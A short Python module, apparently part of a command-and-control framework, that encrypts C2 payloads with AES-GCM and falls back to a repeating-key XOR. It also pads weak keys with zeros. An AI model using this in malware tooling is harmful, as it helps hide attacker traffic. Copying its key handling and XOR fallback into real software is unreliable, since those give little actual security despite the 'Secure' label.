#!/usr/bin/env python3
"""
Secure C2 Crypto Module
Provides AES-GCM encryption for C2 payloads.
"""

import os
import json
import base64
import config

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    AESGCM = None

class C2Crypto:
    def __init__(self):
        # Use config key, padded/truncated to 32 bytes if needed
        key_str = config.C2_ENCRYPTION_KEY
        if len(key_str) < 32:
            key_str = key_str.ljust(32, '0')
        elif len(key_str) > 32:
            key_str = key_str[:32]

        self.key = key_str.encode('utf-8')

    def encrypt(self, data: dict) -> str:
        payload = json.dumps(data).encode('utf-8')

        if AESGCM:
            nonce = os.urandom(12)
            aesgcm = AESGCM(self.key)
            ciphertext = aesgcm.encrypt(nonce, payload, None)
            return base64.b64encode(nonce + ciphertext).decode('utf-8')
        else:
            # XOR Fallback
            key_bytes = self.key
            encrypted = bytearray()
            for i, b in enumerate(payload):
                encrypted.append(b ^ key_bytes[i % len(key_bytes)])
            return base64.b64encode(encrypted).decode('utf-8')

c2_crypto = C2Crypto()
